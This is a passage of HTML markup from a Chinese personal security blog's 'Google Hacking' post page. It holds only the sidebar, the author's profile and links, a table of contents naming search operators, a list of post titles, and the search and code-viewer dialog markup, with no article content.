magePaths&quot;:[1,[[0,&quot;img/22.png&quot;],[0,&quot;img/23.png&quot;],[0,&quot;img/24.png&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/15&quot;]}]}" ssr client="load" opts="{&quot;name&quot;:&quot;HomeSiderPanel&quot;,&quot;value&quot;:true}" await-children><link rel="preload" as="image" href="/img/724d7fb480c8ac0db472ca5c7e36d239.jpg" fetchPriority="high"/><div class="cursor-pointer rounded-sm bg-black/8 p-1 font-semibold backdrop-blur-lg select-none my-4 flex w-full justify-between text-sm/6"><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs opacity-50 grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2ZM12 4C7.58172 4 4 7.58172 4 12C4 16.4183 7.58172 20 12 20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4ZM15.8329 7.33748C16.0697 7.17128 16.3916 7.19926 16.5962 7.40381C16.8002 7.60784 16.8267 7.92955 16.6587 8.16418C14.479 11.2095 13.2796 12.8417 13.0607 13.0607C12.4749 13.6464 11.5251 13.6464 10.9393 13.0607C10.3536 12.4749 10.3536 11.5251 10.9393 10.9393C11.3126 10.5661 12.9438 9.36549 15.8329 7.33748ZM17.5 11C18.0523 11 18.5 11.4477 18.5 12C18.5 12.5523 18.0523 13 17.5 13C16.9477 13 16.5 12.5523 16.5 12C16.5 11.4477 16.9477 11 17.5 11ZM6.5 11C7.05228 11 7.5 11.4477 7.5 12C7.5 12.5523 7.05228 13 6.5 13C5.94772 13 5.5 12.5523 5.5 12C5.5 11.4477 5.94772 11 6.5 11ZM8.81802 7.40381C9.20854 7.79433 9.20854 8.4275 8.81802 8.81802C8.4275 9.20854 7.79433 9.20854 7.40381 8.81802C7.01328 8.4275 7.01328 7.79433 7.40381 7.40381C7.79433 7.01328 8.4275 7.01328 8.81802 7.40381ZM12 5.5C12.5523 5.5 13 5.94772 13 6.5C13 7.05228 12.5523 7.5 12 7.5C11.4477 7.5 11 7.05228 11 6.5C11 5.94772 11.4477 5.5 12 5.5Z"></path></svg></span></div><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs text-primary-foreground grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M5.75024 3.5H4.71733L3.25 3.89317V5.44582L4.25002 5.17782L4.25018 8.5H3V10H7V8.5H5.75024V3.5ZM10 4H21V6H10V4ZM10 11H21V13H10V11ZM10 18H21V20H10V18ZM2.875 15.625C2.875 14.4514 3.82639 13.5 5 13.5C6.17361 13.5 7.125 14.4514 7.125 15.625C7.125 16.1106 6.96183 16.5587 6.68747 16.9167L6.68271 16.9229L5.31587 18.5H7V20H3.00012L2.99959 18.8786L5.4717 16.035C5.5673 15.9252 5.625 15.7821 5.625 15.625C5.625 15.2798 5.34518 15 5 15C4.67378 15 4.40573 15.2501 4.37747 15.5688L4.3651 15.875H2.875V15.625Z"></path></svg></span><span class="overflow-hidden whitespace-nowrap" style="width:auto;opacity:1">文章目录</span><div class="bg-gradient-shoka-button absolute inset-0 -z-10 rounded-sm" style="will-change:transform"></div></div><div class="flex-center relative cursor-pointer gap-1.5 px-3 py-1 first:rounded-l-xs last:rounded-r-xs opacity-50 grow"><span class="flex-center shrink-0"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="w-4 h-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M20 22H4C3.44772 22 3 21.5523 3 21V3C3 2.44772 3.44772 2 4 2H20C20.5523 2 21 2.44772 21 3V21C21 21.5523 20.5523 22 20 22ZM19 20V4H5V20H19ZM7 6H11V10H7V6ZM7 12H17V14H7V12ZM7 16H17V18H7V16ZM13 7H17V9H13V7Z"></path></svg></span></div></div><div class="vertical-scrollbar pt-10 scroll-gutter-stable relative block w-full flex-1 min-h-0 overflow-x-hidden overflow-y-auto md:pt-4 md:pl-3" data-type="post" data-default-type="directory"><div class="sider-slot" data-slot-type="info"><div class="flex flex-col items-center"><div class="h-40 w-40 rounded-full" style="background-image:linear-gradient(135deg, #9e8764 0%, #ae7b62 50%, #644235 100%)"><img class="shadow-card-darker hover:animate-shake h-full w-full rounded-full transition" src="/img/724d7fb480c8ac0db472ca5c7e36d239.jpg" alt="Kaguya avatar" loading="eager" fetchPriority="high"/></div><p class="mt-2">Kaguya</p><p class="text-muted-foreground mt-3 text-center">ACG / 养猫人 / 菜逼 / 黑客 / 臭美</p><div class="mt-2 grid grid-cols-3 gap-2"><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#191717" data-platform="github" href="https://github.com/kaguyahi" title="GitHub" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="GitHub"><i class="fa-brands fa-github social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#4b9ae4" data-platform="x" href="https://x.com/" title="X (推特)" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="X (推特)"><i class="fa-brands fa-x-twitter social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div><div><a class="social-link flex-center group relative overflow-hidden rounded-xl px-1.5 py-1 transition-all duration-300 group-hover:scale-105" style="--link-color:#55acd5" data-platform="email" href="mailto:2517029339@qq.com" title="Email" data-tooltip-interactive="false" data-tooltip-placement="top" aria-label="Email"><i class="fa-regular fa-envelope social-icon" aria-hidden="true"></i><span class="absolute inset-0 -z-10 -translate-x-full translate-y-full rounded-xl transition-transform duration-300 group-hover:translate-x-0 group-hover:translate-y-0"></span></a></div></div><div class="text-muted-foreground mt-3 flex justify-center text-center text-sm/4 whitespace-nowrap select-none dark:text-white/80"><a href="/blog" class="hover:text-blue flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">20</span>文章</a><div class="bg-muted-foreground mx-3 w-px"></div><a href="/blog/categories" aria-label="分类" class="hover:text-blue"><p class="flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">4</span>分类</p></a><div class="bg-muted-foreground mx-3 w-px"></div><a href="/blog/tags" class="hover:text-blue flex cursor-pointer flex-col gap-2 p-1 transition"><span class="text-lg/5 font-bold">20</span>标签</a></div><div class="mt-6 flex w-full flex-col items-center gap-2.5"><a href="/blog" aria-label="首页" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-house-chimney" aria-hidden="true"></i>首页</a><div class="bg-foreground/10 flex w-40 flex-col rounded-xl opacity-75 transition-all duration-300 hover:opacity-100" data-collapsible="true"><button class="flex-center hover:bg-foreground/5 h-12 w-full cursor-pointer rounded-xl transition-colors" aria-expanded="false" aria-controls="_r15R_a_-collapse-1" aria-label="文章菜单" type="button"><i class="mr-1.5 fa-solid fa-pen-nib" aria-hidden="true"></i>文章<i class="fa-solid fa-caret-down ml-2 text-base transition-transform duration-300" aria-hidden="true"></i></button><div id="_r15R_a_-collapse-1" class="collapse-content collapse-hidden" data-collapse-content="true"><div class="flex flex-col items-center"><a href="/blog/categories" aria-label="分类" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-layer-group" aria-hidden="true"></i>分类</a><a href="/blog/tags" aria-label="标签" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-tags" aria-hidden="true"></i>标签</a></div></div></div><a href="/blog/friends" aria-label="友链" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-solid fa-link" aria-hidden="true"></i>友链</a><a href="/blog/about" aria-label="关于" class="inline-flex items-center justify-center whitespace-nowrap ring-offset-background focus-visible:outline-hidden focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 bg-gradient-shoka-button px-4 py-2 shoka-button-shadow h-12 w-40 rounded-xl text-base tracking-wider opacity-75 transition-all duration-300 hover:opacity-100 text-muted-foreground/80 hover:bg-muted-foreground/10 bg-none shadow-none hover:shadow-none"><i class="mr-1.5 fa-regular fa-circle-user" aria-hidden="true"></i>关于</a></div></div></div><div class="sider-slot hidden" data-slot-type="directory"><nav class="toc-container max-h-[90dvh] overflow-auto " aria-label="文章目录"><div class="space-y-1 pr-2"><div class="heading-tree-item relative"><a href="#site" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="site:"><span class="heading-text block flex-1 truncate leading-relaxed">site:</span></a></div><div class="heading-tree-item relative"><a href="#filetype" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="filetype:"><span class="heading-text block flex-1 truncate leading-relaxed">filetype:</span></a></div><div class="heading-tree-item relative"><a href="#inurl" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="inurl:"><span class="heading-text block flex-1 truncate leading-relaxed">inurl:</span></a></div><div class="heading-tree-item relative"><a href="#intitle" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.75rem" data-level="1" aria-label="intitle:"><span class="heading-text block flex-1 truncate leading-relaxed">intitle:</span></a></div><div class="heading-tree-item relative"><a href="#intext" class="heading-link group hover:bg-foreground/5 relative flex items-center rounded-md py-2 text-sm transition-all duration-200 hover:border-l-2" style="padding-left:0.75rem;padding-right:0.5rem" data-level="1" aria-label="intext："><span class="heading-text block flex-1 truncate leading-relaxed">intext：</span></a></div></div></nav></div><div class="sider-slot hidden" data-slot-type="series"><div class="flex flex-col gap-1"><a href="/blog/post/18" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">一些情报源</span></a><a href="/blog/post/14" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50 text-primary font-medium"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-primary"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-primary">Google Hacking</span></a><a href="/blog/post/15" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">JAVA奇怪的命令执行</span></a><a href="/blog/post/7" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">Common process for handling objectives</span></a><a href="/blog/post/5" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">Mandatory manual</span></a><a href="/blog/post/6" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">信息收集</span></a><a href="/blog/post/2" class="group relative flex items-start gap-3 rounded-md px-1 py-2 transition-colors hover:bg-accent/50"><span class="mt-2 h-2 w-2 shrink-0 rounded-full transition-colors bg-muted-foreground/40 group-hover:bg-muted-foreground/60"></span><span class="line-clamp-2 flex-1 text-sm leading-relaxed transition-colors text-foreground group-hover:text-primary">人肉搜索</span></a></div></div></div><div class="border-border mt-4 flex flex-col gap-3 border-t pt-4 md:mt-0 md:pt-2 w-full px-2"><div class="flex items-center justify-between gap-2"><a href="/blog/post/18" class="group flex items-center gap-1.5 rounded-md px-2 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary max-w-[45%] min-w-0 flex-1" title="一些情报源"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4 shrink-0" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M10.8284 12.0007L15.7782 16.9504L14.364 18.3646L8 12.0007L14.364 5.63672L15.7782 7.05093L10.8284 12.0007Z"></path></svg><span class="truncate text-xs">一些情报源</span></a><a href="/blog/post/15" class="group flex items-center gap-1.5 rounded-md px-2 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary max-w-[45%] min-w-0 flex-1 justify-end text-right" title="JAVA奇怪的命令执行"><span class="truncate text-xs">JAVA奇怪的命令执行</span><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4 shrink-0" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path></svg></a></div><div class="flex justify-center gap-2"><button class="flex items-center justify-center gap-1.5 rounded-md px-3 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary text-xs" title="回到顶部" aria-label="回到顶部"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M11.9999 10.8284L7.0502 15.7782L5.63599 14.364L11.9999 8L18.3639 14.364L16.9497 15.7782L11.9999 10.8284Z"></path></svg>回到顶部</button><button class="flex items-center justify-center gap-1.5 rounded-md px-3 py-1.5 transition-colors hover:bg-accent text-muted-foreground hover:text-primary text-xs" title="滚到底部" aria-label="滚到底部"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="h-4 w-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M11.9999 13.1714L16.9497 8.22168L18.3639 9.63589L11.9999 15.9999L5.63599 9.63589L7.0502 8.22168L11.9999 13.1714Z"></path></svg>滚到底部</button></div></div><div class="mt-auto w-full rounded-full pt-4 sticky bottom-0"><div class="bg-primary h-1 origin-left rounded-full scale-x-0"></div></div><!--astro:end--></astro-island> </div> </astro-slot></div></div><!--astro:end--></astro-island> <!-- 遮罩层 --><div id="search-overlay" data-state="closed" class="fixed inset-0 z-40 bg-black/50 opacity-0 backdrop-blur-sm transition-opacity duration-200 data-[state=closed]:hidden" role="presentation" aria-hidden="true"></div> <!-- 搜索对话框 --> <div id="search-dialog" data-state="closed" class="fixed inset-0 z-50 grid place-items-center px-4 data-[state=closed]:hidden" role="dialog" aria-label="搜索文章" aria-modal="true"> <div id="search-dialog-content" class="bg-gradient-start shadow-box w-full max-w-3xl overflow-auto rounded-xl opacity-0 transition-all duration-200"> <div class="relative p-6 md:p-3"> <div class="search-dialog"> <!-- Header --> <div class="relative mb-4 flex items-center justify-between"> <h2 class="flex items-center gap-2 text-lg font-semibold md:text-base"> <i class="fa-solid fa-magnifying-glass text-base md:text-sm" aria-hidden="true"></i>
搜索文章
</h2> <button id="search-dialog-close" class="flex size-8 items-center justify-center rounded-full bg-black/5 transition-colors duration-300 hover:bg-black/10 md:size-7 dark:bg-white/10 dark:hover:bg-white/20" aria-label="关闭搜索"> <i class="fa-solid fa-xmark text-base md:text-sm" aria-hidden="true"></i> </button> </div> <div id="search-empty-hint" class="search-empty-hint absolute inset-x-0 top-32 text-center text-sm opacity-60 md:top-28"> <p>输入关键词搜索博客文章</p> <p class="mt-1 text-xs">
按 <kbd class="rounded bg-black/10 px-1.5 py-0.5 font-mono dark:bg-white/10">ESC</kbd> 关闭
</p> </div> <!-- Search Content Area --> <div class="vertical-scrollbar scroll-feather-mask -mx-6 h-[calc(80dvh-140px)] overflow-auto scroll-smooth px-6 pb-10 md:-mx-3 md:h-[calc(80dvh-120px)] md:px-3"> <!-- Search Container --> <div id="search-dialog-container"></div> </div> </div> <!-- Keyboard hints --> <div class="bg-background/2 absolute inset-x-0 bottom-0 z-10 flex items-center justify-center gap-4 px-4 pt-2 pb-4 text-xs text-black/50 dark:border-white/10 dark:text-white/50"> <span><kbd class="kbd">↑↓</kbd> 选择</span> <span><kbd class="kbd">Enter</kbd> 打开</span> <span><kbd class="kbd">ESC</kbd> 关闭</span> </div> </div> </div> </div> <script type="module" src="/_astro/SearchDialog.astro_astro_type_script_index_0_lang.B0CSJxN3.js"></script>  <!-- 遮罩层 --><div id="code-fullscreen-overlay" data-state="closed" class="fixed inset-0 z-40 bg-black/80 opacity-0 backdrop-blur-sm transition-opacity duration-200 data-[state=closed]:hidden" role="presentation" aria-hidden="true"></div> <!-- 代码全屏对话框 --> <div id="code-fullscreen-dialog" data-state="closed" class="fixed inset-0 z-50 grid place-items-center px-4 data-[state=closed]:hidden" role="dialog" aria-label="代码全屏预览" aria-modal="true"> <div id="code-fullscreen-content" class="bg-background relative flex h-[85vh] w-[90vw] max-w-6xl flex-col overflow-hidden rounded-xl opacity-0 shadow-2xl transition-opacity duration-200 md:max-w-[90vw]"> <!-- Toolbar --> <div class="border-border bg-muted/50 flex shrink-0 items-center justify-between border-b px-4 py-3 backdrop-blur-sm"> <div class="flex items-center gap-3"> <div class="flex gap-2"> <span class="h-3 w-3 rounded-full bg-[#ff5f56]"></span> <span class="h-3 w-3 rounded-full bg-[#ffbd2e]"></span> <span class="h-3 w-3 rounded-full bg-[#27c93f]"></span> </div> <span id="code-fullscreen-language" class="text-muted-foreground font-mono text-xs font-medium tracking-wider uppercase">
text
</span> </div> <div class="flex items-center gap-1"> <button id="code-fullscreen-copy" class="text-muted-foreground hover:bg-accent hover:text-accent-foreground flex items-center gap-2 rounded-md px-3 py-1.5 transition-colors"> <!-- Copy icon --> <svg id="code-fullscreen-copy-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 448 512" fill="currentColor"> <path d="M192 0c-35.3 0-64 28.7-64 64l0 256c0 35.3 28.7 64 64 64l192 0c35.3 0 64-28.7 64-64l0-200.6c0-17.4-7.1-34.1-19.7-46.2L370.6 17.8C358.7 6.4 342.8 0 326.3 0L192 0zM64 128c-35.3 0-64 28.7-64 64L0 448c0 35.3 28.7 64 64 64l192 0c35.3 0 64-28.7 64-64l0-16-64 0 0 16-192 0 0-256 16 0 0-64-16 0z"></path> </svg> <!-- Checkmark icon (hidden by default) --> <svg id="code-fullscreen-check-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="hidden"> <mask id="checkmark-anim-fullscreen"> <g fill="none" stroke="#fff" stroke-dasharray="24" stroke-dashoffset="24" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"> <path d="M2 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" dur="0.4s" values="24;0"></animate> </path> <path stroke="#000" stroke-width="6" d="M7.5 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" begin="0.4s" dur="0.4s" values="24;0"></animate> </path> <path d="M7.5 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" begin="0.4s" dur="0.4s" values="24;0"></animate> </path> </g> </mask> <rect width="24" height="24" fill="currentColor" mask="url(#checkmark-anim-fullscreen)"></rect> </svg> <span id="code-fullscreen-copy-text" class="text-sm">复制</span> </button> <button id="code-fullscreen-close" class="text-muted-foreground hover:bg-accent hover:text-accent-foreground rounded-md p-2 transition-colors" aria-label="关闭"> <i class="fa-solid fa-xmark text-base" aria-hidden="true"></i> </button> </div> </div> <!-- Code Content --> <div class="scroll-feather-mask flex-1 overflow-auto"> <pre id="code-fullscreen-pre" class="p-4"><code id="code-fullscreen-code"></code></pre> </div> </div> </div> <script type="module" src="/_astro/CodeBlockFullscreen.astro_astro_type_script_index_0_lang.BUCnEfx7.js"></script> <!-- Overlay --><div id="mermaid-fullscreen-overlay" data-state="closed" class="fixed inset-0 z-40 bg-black/80 opacity-0 backdrop-blur-sm transition-opacity duration-200 data-[state=closed]:hidden" role="presentation" aria-hidden="true"></div> <!-- Mermaid Fullscreen Dialog --> <div id="mermaid-fullscreen-dialog" data-state="closed" class="fixed inset-0 z-50 grid place-items-center px-4 data-[state=closed]:hidden" role="dialog" aria-label="Mermaid diagram fullscreen" aria-modal="true"> <div id="mermaid-fullscreen-content" class="bg-background relative flex h-[85vh] w-[90vw] max-w-6xl flex-col overflow-hidden rounded-xl opacity-0 shadow-2xl transition-opacity duration-200 md:max-w-[90vw]"> <!-- Toolbar --> <div class="border-border bg-muted/50 flex shrink-0 items-center justify-between border-b px-4 py-3 backdrop-blur-sm"> <div class="flex items-center gap-3"> <div class="flex gap-2"> <span class="h-3 w-3 rounded-full bg-[#ff5f56]"></span> <span class="h-3 w-3 rounded-full bg-[#ffbd2e]"></span> <span class="h-3 w-3 rounded-full bg-[#27c93f]"></span> </div> <span class="text-muted-foreground font-mono text-xs font-medium tracking-wider uppercase"> mermaid </span> </div> <div class="flex items-center gap-1"> <!-- Zoom info --> <span id="mermaid-zoom-level" class="text-muted-foreground mr-2 text-sm">100%</span> <!-- Reset zoom button --> <button id="mermaid-fullscreen-reset" class="text-muted-foreground hover:bg-accent hover:text-accent-foreground flex items-center gap-2 rounded-md px-3 py-1.5 transition-colors" title="Reset zoom"> <i class="fa-solid fa-rotate-right text-sm" aria-hidden="true"></i> </button> <!-- Copy button --> <button id="mermaid-fullscreen-copy" class="text-muted-foreground hover:bg-accent hover:text-accent-foreground flex items-center gap-2 rounded-md px-3 py-1.5 transition-colors"> <svg id="mermaid-fullscreen-copy-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 448 512" fill="currentColor"> <path d="M192 0c-35.3 0-64 28.7-64 64l0 256c0 35.3 28.7 64 64 64l192 0c35.3 0 64-28.7 64-64l0-200.6c0-17.4-7.1-34.1-19.7-46.2L370.6 17.8C358.7 6.4 342.8 0 326.3 0L192 0zM64 128c-35.3 0-64 28.7-64 64L0 448c0 35.3 28.7 64 64 64l192 0c35.3 0 64-28.7 64-64l0-16-64 0 0 16-192 0 0-256 16 0 0-64-16 0z"></path> </svg> <svg id="mermaid-fullscreen-check-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="hidden"> <mask id="checkmark-anim-mermaid-fullscreen"> <g fill="none" stroke="#fff" stroke-dasharray="24" stroke-dashoffset="24" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"> <path d="M2 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" dur="0.4s" values="24;0"></animate> </path> <path stroke="#000" stroke-width="6" d="M7.5 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" begin="0.4s" dur="0.4s" values="24;0"></animate> </path> <path d="M7.5 13.5l4 4l10.75 -10.75"> <animate fill="freeze" attributeName="stroke-dashoffset" begin="0.4s" dur="0.4s" values="24;0"></animate> </path> </g> </mask> <rect width="24" height="24" fill="currentColor" mask="url(#checkmark-anim-mermaid-fullscreen)"></rect> </svg> <span id="mermaid-fullscreen-copy-text" class="text-sm">Copy</span> </button> <!-- Close button --> <button id="mermaid-fullscreen-close" class="text-muted-foreground hover:bg-accent hover:text-accent-foreground rounded-md p-2 transition-colors" aria-label="Close"> <i class="fa-solid fa-xmark text-base" aria-hidden="true"></i> </button> </div> </div> <!-- SVG Container with zoom/pan --> <div id="mermaid-fullscreen-viewport" class="flex flex-1 cursor-grab items-center justify-center overflow-hidden active:cursor-grabbing"> <div id="mermaid-fullscreen-svg" class="mermaid-svg-container origin-center transition-transform duration-100"></div> </div> </div> </div> <script type="module" src="/_astro/MermaidFullscreen.astro_astro_type_script_index_0_lang.DIkgBJYA.js"></script> </div> </body></html>